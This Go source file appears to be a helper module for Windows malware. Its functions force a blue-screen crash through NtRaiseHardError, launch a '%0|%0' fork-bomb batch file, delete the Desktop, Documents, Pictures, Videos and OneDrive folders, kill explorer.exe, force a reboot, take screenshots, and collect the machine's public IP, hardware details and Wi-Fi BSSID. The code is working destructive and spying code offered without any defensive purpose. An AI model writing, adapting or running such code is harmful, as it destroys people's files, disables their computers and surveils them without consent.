package main

import (
	"fmt"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
	"github.com/tawesoft/golib/v2/dialog"
	"github.com/vova616/screenshot"
	"image/png"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"syscall"
	"unsafe"
)

type SysInfo struct {
	IP       string
	Hostname string
	Platform string
	CPU      string
	RAM      uint64
	Disk     uint64
}

var (
	ntdll              = syscall.NewLazyDLL("ntdll.dll")
	RtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
)

func DoBSoD(opcode uintptr) {
	RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(new(bool))))
	NtRaiseHardError.Call(opcode, 0, 0, uintptr(0), 6, uintptr(unsafe.Pointer(new(uintptr))))
}

func StarveSystem() {
	file := TEMP + "\\" + RandStringBytes(8) + ".bat"

	f, _ := os.Create(file)
	f.Close()

	err := os.WriteFile(file, []byte("%0|%0"), 0644)

	if err != nil {
		fmt.Println("Something went wrong: ", err)
	}

	exec.Command("cmd.exe", "/C", file).Start()
}

func DeletePersonal() {
	NukeDirectory("Desktop")
	NukeDirectory("Pictures")
	NukeDirectory("Images")
	NukeDirectory("Documents")
	NukeDirectory("Videos")
}

func NukeDirectory(dir string) {
	os.RemoveAll(PERSONAL + "\\" + dir)
	os.RemoveAll(PERSONAL + "OneDrive\\" + dir)
	os.MkdirAll(PERSONAL+"\\"+dir, 777)
	os.MkdirAll(PERSONAL+"OneDrive\\"+dir, 777)
}

func KillDesktop() {
	err := exec.Command("cmd.exe", "/c", "taskkill", "/f", "/t", "/im", "explorer.exe").Run()
	if err != nil {
		fmt.Println("Failed to kill Desktop process:", err)
	}
}

func ForceShutdown() {
	if err := exec.Command("cmd.exe", "/C", "shutdown", "/t", "0", "/r").Run(); err != nil {
		fmt.Println("Failed to initiate shutdown:", err)
	}
}

func GetScreenShot() []byte {
	if _, err := os.Stat(TEMPFILEDIR); os.IsNotExist(err) {
		os.MkdirAll(TEMPFILEDIR, 0700)
	}

	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create(TEMPFILEDIR + "\\CAPTURE.png")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	var _ = f.Close()

	data, _ := os.ReadFile(TEMPFILEDIR + "\\CAPTURE.png")

	return data
}

func GetSysInfo() *SysInfo {
	hostStat, _ := host.Info()
	cpuStat, _ := cpu.Info()
	vmStat, _ := mem.VirtualMemory()
	diskStat, _ := disk.Usage("\\") // If you're in Unix change this "\\" for "/"

	System := new(SysInfo)

	resp, _ := http.Get("https://myexternalip.com/raw")
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	System.IP = string(body)
	System.Hostname = hostStat.Hostname
	System.CPU = cpuStat[0].ModelName
	System.Platform = hostStat.Platform
	System.RAM = vmStat.Total / 1024 / 1024
	System.Disk = diskStat.Total / 1024 / 1024

	return System
}

func GetBSSID() string {
	out, err := exec.Command("cmd", "/c", "netsh wlan show interfaces").CombinedOutput()
	if err != nil {
		fmt.Println("Failed to find BSSID:", err)
	}

	Expression1, e := regexp.Compile("(BSSID[ \\t]*:[ \\t])(([0-9a-f]{2}([:]|)){6})")
	Expression2, e := regexp.Compile("(([0-9a-f]{2}([:]|)){6})")
	if e != nil {
		log.Fatalf(e.Error())
	}

	var RegexFind []string = Expression2.FindAllString(Expression1.FindAllString(string(out), -1)[0], -1)

	if len(RegexFind) == 0 || RegexFind[0] == "" {
		return "None"
	} else {
		return RegexFind[0]
	}
}

func DisplayErrorMsg(title string, description string) {
	dialog.Message{
		Title:  title,
		Format: description,
		Icon:   dialog.IconError,
	}.Raise()
}
